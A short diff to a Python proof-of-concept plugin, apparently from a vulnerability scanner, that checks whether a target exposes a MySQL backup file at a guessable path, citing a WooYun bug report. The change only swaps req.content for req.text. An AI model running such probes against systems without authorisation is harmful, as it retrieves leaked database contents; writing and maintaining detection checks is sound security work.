@@ -49,7 +49,7 @@ class Poc(ABPoc):
             # http://www.wooyun.org/bugs/wooyun-2010-0106292
             verify_url = ('%s/data/backup/VICWOR~1.SQL') % self.target
             req = requests.get(verify_url)
-            if req.status_code == 200 and 'MySQL dump' in req.content:
+            if req.status_code == 200 and 'MySQL dump' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
